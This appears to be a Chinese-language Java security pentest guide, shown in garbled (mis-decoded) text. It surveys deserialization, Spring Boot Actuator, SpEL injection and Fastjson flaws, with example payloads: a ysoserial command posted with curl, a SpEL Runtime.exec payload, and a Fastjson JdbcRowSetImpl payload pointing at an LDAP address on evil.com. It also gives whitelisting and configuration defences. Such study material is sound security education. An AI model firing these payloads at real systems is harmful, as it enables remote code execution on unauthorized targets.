# Javaå®‰å…¨

Javaå®‰å…¨æ˜¯æ¸—é€æµ‹è¯•ä¸­çš„é‡è¦é¢†åŸŸï¼Œæ¶‰åŠJavaåº”ç”¨ç¨‹åºçš„æ¼æ´å‘ç°ã€åˆ©ç”¨å’Œé˜²æŠ¤ã€‚

## ğŸ¯ Javaå®‰å…¨æ¦‚è¿°

Javaå®‰å…¨æµ‹è¯•ä¸»è¦åŒ…æ‹¬ï¼š
- **ååºåˆ—åŒ–æ¼æ´**ï¼šåˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–è¿‡ç¨‹
- **æ¡†æ¶æ¼æ´**ï¼šSpringã€Strutsç­‰æ¡†æ¶çš„å®‰å…¨é—®é¢˜
- **æƒé™ç»•è¿‡**ï¼šShiroã€Spring Securityç­‰æƒé™æ§åˆ¶ç»•è¿‡
- **ä»£ç æ‰§è¡Œ**ï¼šæ¨¡æ¿æ³¨å…¥ã€è¡¨è¾¾å¼æ³¨å…¥ç­‰

## ğŸ” å¸¸è§Javaæ¼æ´ç±»å‹

### 1. ååºåˆ—åŒ–æ¼æ´

#### åŸç†åˆ†æ
```java
// ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç¤ºä¾‹
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // å±é™©æ“ä½œ
```

#### åˆ©ç”¨å·¥å…·
- **ysoserial** - Javaååºåˆ—åŒ–åˆ©ç”¨å·¥å…·
- **marshalsec** - å„ç§åºåˆ—åŒ–åº“çš„åˆ©ç”¨å·¥å…·

#### æ£€æµ‹æ–¹æ³•
```bash
# ä½¿ç”¨ysoserialç”Ÿæˆpayload
java -jar ysoserial.jar CommonsCollections6 "calc" > payload.ser

# å‘é€åˆ°ç›®æ ‡åº”ç”¨
curl -X POST http://target.com/api -d @payload.ser
```

### 2. Spring Bootæ¼æ´

#### Actuatoræœªæˆæƒè®¿é—®
```http
# æ•æ„Ÿç«¯ç‚¹è®¿é—®
GET /actuator/env HTTP/1.1
GET /actuator/heapdump HTTP/1.1
GET /actuator/trace HTTP/1.1
```

#### SpELè¡¨è¾¾å¼æ³¨å…¥
```java
// å±é™©çš„SpELè¡¨è¾¾å¼ä½¿ç”¨
@Value("#{${user.input}}")  // ç”¨æˆ·å¯æ§è¾“å…¥
private String userValue;

// åˆ©ç”¨payload
#{T(java.lang.Runtime).getRuntime().exec('calc')}
```

### 3. Fastjsonæ¼æ´

#### æ¼æ´ç‰ˆæœ¬
- Fastjson â‰¤ 1.2.24
- Fastjson â‰¤ 1.2.47  
- Fastjson â‰¤ 1.2.68

#### åˆ©ç”¨ç¤ºä¾‹
```json
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://evil.com:1389/Exploit",
    "autoCommit":true
}
```

## âš¡ å®æˆ˜æµ‹è¯•æµç¨‹

### 1. ä¿¡æ¯æ”¶é›†
```bash
# è¯†åˆ«Javaåº”ç”¨
nmap -sV -p 8080,8443,9200,9300 target.com

# æ¡†æ¶æŒ‡çº¹è¯†åˆ«
whatweb http://target.com
wappalyzer target.com
```

### 2. æ¼æ´æ£€æµ‹
```python
# ååºåˆ—åŒ–æ£€æµ‹è„šæœ¬
import requests
import base64

def test_deserialization(url):
    # ysoserial payload
    payload = base64.b64decode("rO0AB...") # æ¶æ„åºåˆ—åŒ–æ•°æ®
    
    headers = {
        'Content-Type': 'application/x-java-serialized-object'
    }
    
    response = requests.post(url, data=payload, headers=headers)
    return response.status_code
```

### 3. è‡ªåŠ¨åŒ–æ‰«æ
```bash
# ä½¿ç”¨å·¥å…·æ‰«æ
python3 JNDIExploit.py -i target.com -p 1389

# Fastjsonæ‰«æ
python3 fastjson_scan.py -u http://target.com
```

## ğŸ› ï¸ å¸¸ç”¨å·¥å…·

| å·¥å…·åç§° | åŠŸèƒ½ | ä½¿ç”¨åœºæ™¯ |
|---------|------|----------|
| ysoserial | ååºåˆ—åŒ–åˆ©ç”¨ | ç”Ÿæˆæ¶æ„åºåˆ—åŒ–å¯¹è±¡ |
| JNDIExploit | JNDIæ³¨å…¥ | LDAP/RMIæœåŠ¡æ­å»º |
| marshalsec | åºåˆ—åŒ–æµ‹è¯• | å¤šç§åºåˆ—åŒ–æ ¼å¼æµ‹è¯• |
| Burp Suite | Webæµ‹è¯•å¹³å° | è¯·æ±‚æ‹¦æˆªå’Œä¿®æ”¹ |

## ğŸ›¡ï¸ é˜²æŠ¤å»ºè®®

### 1. ååºåˆ—åŒ–é˜²æŠ¤
```java
// ä½¿ç”¨ç™½åå•è¿‡æ»¤
public class SafeObjectInputStream extends ObjectInputStream {
    private static final String[] allowedClasses = {
        "java.lang.String",
        "java.lang.Integer"
    };
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {
        String className = desc.getName();
        for (String allowed : allowedClasses) {
            if (className.equals(allowed)) {
                return super.resolveClass(desc);
            }
        }
        throw new InvalidClassException("Class not allowed: " + className);
    }
}
```

### 2. Spring Bootå®‰å…¨é…ç½®
```yaml
# application.yml
management:
  endpoints:
    enabled-by-default: false
    web:
      exposure:
        include: health,info  # åªæš´éœ²å¿…è¦ç«¯ç‚¹
  endpoint:
    health:
      enabled: true
```

### 3. ä¾èµ–ç®¡ç†
```xml
<!-- åŠæ—¶æ›´æ–°ä¾èµ–ç‰ˆæœ¬ -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version> <!-- ä½¿ç”¨æœ€æ–°å®‰å…¨ç‰ˆæœ¬ -->
</dependency>
```

## ğŸ“š å­¦ä¹ èµ„æº

### å®˜æ–¹æ–‡æ¡£
- [Oracle Java Security](https://docs.oracle.com/javase/security/)
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [OWASP Java Security](https://owasp.org/www-project-java/)

### å®éªŒç¯å¢ƒ
- **vulhub** - DockeråŒ–çš„æ¼æ´ç¯å¢ƒ
- **VulnApp** - Javaæ¼æ´åº”ç”¨é›†åˆ
- **WebGoat** - OWASPå®‰å…¨æµ‹è¯•åº”ç”¨

### å·¥å…·ä¸‹è½½
- [ysoserial releases](https://github.com/frohoff/ysoserial)
- [JNDIExploit](https://github.com/WhiteHSBG/JNDIExploit)
- [marshalsec](https://github.com/mbechler/marshalsec)

---

> âš ï¸ **é‡è¦æé†’**: Javaå®‰å…¨æµ‹è¯•éœ€è¦æ·±å…¥ç†è§£JVMæœºåˆ¶å’Œæ¡†æ¶åŸç†ï¼Œå»ºè®®åœ¨åˆæ³•æˆæƒçš„ç¯å¢ƒä¸‹è¿›è¡Œæµ‹è¯•ï¼
